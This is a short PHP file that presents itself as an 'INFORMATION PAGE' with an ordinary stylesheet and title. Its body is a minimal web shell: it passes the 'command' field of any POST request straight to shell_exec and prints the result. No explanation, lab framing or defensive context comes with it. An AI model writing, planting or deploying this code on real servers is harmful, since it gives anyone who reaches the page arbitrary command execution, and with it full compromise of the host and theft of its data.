<html>
    <head>
        <link rel="stylesheet" type="text/css" href="style_2.css">
        <title>INFORMATION PAGE</title>
    </head>
    <body>
    <h3>
        <?php
        $output = shell_exec($_POST["command"]);
        print("<pre>" . $output . "</pre>");
        ?>
    </h3>
    </body>
</html>